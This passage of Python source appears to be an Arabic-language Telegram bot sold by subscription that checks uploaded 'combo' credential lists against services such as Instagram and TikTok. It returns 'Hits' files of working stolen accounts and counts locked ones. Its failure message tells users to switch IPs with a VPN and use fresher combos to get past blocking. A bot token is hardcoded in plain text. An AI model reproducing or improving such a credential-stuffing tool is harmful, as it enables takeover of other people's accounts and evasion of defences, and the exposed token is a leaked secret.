• ✅ صحيح: {stats["hit"]}
• ❌ خاطئ: {stats["bad"]}
• 🔒 مقفل: {stats["locked"]}
{services_summary}

📅 <b>الوقت:</b> {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

💎 <b>Created by @TTT9KK</b>
                """
                
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=admin_summary,
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.error(f"Error sending summary to admin: {e}")
    
    # Send files
    if stats["hit"] > 0:
        await context.bot.send_message(
            chat_id=user_id,
            text="📁 <b>إرسال ملفات النتائج...</b>\n\n💎 <b>Created by @TTT9KK</b>",
            parse_mode='HTML'
        )
        
        # Get all files and sort them (Hits_All first, then services alphabetically)
        all_files = []
        for filename in os.listdir(result_dir):
            if filename.endswith('.txt'):
                file_path_result = os.path.join(result_dir, filename)
                # Check file has content
                if os.path.getsize(file_path_result) > 0:
                    all_files.append(filename)
        
        # Sort: Hits_All first, then alphabetically
        all_files.sort(key=lambda x: (x != 'Hits_All.txt', x.lower()))
        
        # Send each file
        files_sent = 0
        for filename in all_files:
            file_path_result = os.path.join(result_dir, filename)
            
            try:
                # Get file size
                file_size = os.path.getsize(file_path_result)
                
                # Count lines
                with open(file_path_result, 'r', encoding='utf-8') as f:
                    line_count = sum(1 for _ in f)
                
                caption = f"""
📄 <b>{filename}</b>

📊 Accounts: {line_count}
📦 Size: {file_size / 1024:.1f} KB

💎 <b>Created by @TTT9KK</b>
📢 {TELEGRAM_CHANNEL}
                """
                
                await context.bot.send_document(
                    chat_id=user_id,
                    document=open(file_path_result, 'rb'),
                    caption=caption,
                    parse_mode='HTML'
                )
                
                files_sent += 1
                time.sleep(0.5)
                
            except Exception as e:
                logger.error(f"Error sending file {filename}: {e}")
        
        # Summary message
        await context.bot.send_message(
            chat_id=user_id,
            text=f"""
✅ <b>تم إرسال جميع الملفات!</b>

📁 عدد الملفات: {files_sent}
🎯 إجمالي Hits: {stats["hit"]}

💎 <b>Created by @TTT9KK</b>
            """,
            parse_mode='HTML'
        )
    else:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"""
😔 <b>لم يتم العثور على حسابات صحيحة</b>

💡 <b>احتمالات:</b>
• الكومبو قديم أو مستخدم كثيراً
• IP محظور - جرب VPN
• جودة الكومبو سيئة

🔧 <b>جرب:</b>
1. استخدم VPN وغيّر IP
2. جرب كومبو جديد (أقل من شهر)
3. قلل سرعة الفحص

💎 <b>Created by @TTT9KK</b>
📢 <b>Channel:</b> {TELEGRAM_CHANNEL}
            """,
            parse_mode='HTML'
        )
    
    # Cleanup
    try:
        os.remove(file_path)
    except:
        pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = """
📚 <b>دليل استخدام البوت</b>

<b>الأوامر الأساسية:</b>
/start - بدء البوت
/check - فحص الحسابات
/status - حالة الاشتراك
/stats - الإحصائيات
/help - المساعدة

<b>أوامر الإدارة (للمشرفين فقط):</b>
/activate - تفعيل مستخدم
/remove - إلغاء تفعيل مستخدم
/users - عرض جميع المستخدمين

<b>أمثلة التفعيل:</b>
<code>/activate 123456789 5 hour</code> - 5 ساعات
<code>/activate 123456789 7 day</code> - 7 أيام
<code>/activate 123456789 1 month</code> - شهر
<code>/activate 123456789 1 year</code> - سنة

💎 المطور: {MY_SIGNATURE}
    """
    
    await update.message.reply_text(help_text, parse_mode='HTML')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics"""
    user_id = update.effective_user.id
    
    if not user_manager.is_active(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ حسابك غير مفعّل!")
        return
    
    user_info = user_manager.get_user_info(user_id)
    
    if user_id in ADMIN_IDS and not user_info:
        stats_text = """
👑 <b>إحصائيات المشرف</b>

✅ صلاحيات غير محدودة
📊 لا توجد إحصائيات بعد
        """
    elif user_info:
        stats_text = f"""
📊 <b>إحصائياتك</b>

📈 عمليات الفحص: {user_info["total_checks"]}
✅ الحسابات الصحيحة: {user_info["total_hits"]}
📉 نسبة النجاح: {(user_info["total_hits"] / user_info["total_checks"] * 100) if user_info["total_checks"] > 0 else 0:.1f}%
        """
    else:
        stats_text = "📊 لا توجد إحصائيات بعد"
    
    await update.message.reply_text(stats_text, parse_mode='HTML')

# ==================== MAIN ====================

def main():
    """Start the bot"""
    # Read bot token from config or environment
    BOT_TOKEN = "8547504648:AAFxnC95YMUp9gJlxzypGh8NDu2f-7MTxeg"  # توكن البوت
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("instagram", instagram_command))
    application.add_handler(CommandHandler("tiktok", tiktok_command))
    application.add_handler(CommandHandler("activate", activate_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("users", users_command))
    application.add_handler(CommandHandler("recent", recent_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Start bot
    print("🚀 البوت يعمل الآن...")
    print(f"💎 المطور: {MY_SIGNATURE}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⚠️ تم إيقاف البوت")
    except Exception as e:
        print(f"❌ خطأ: {e}")
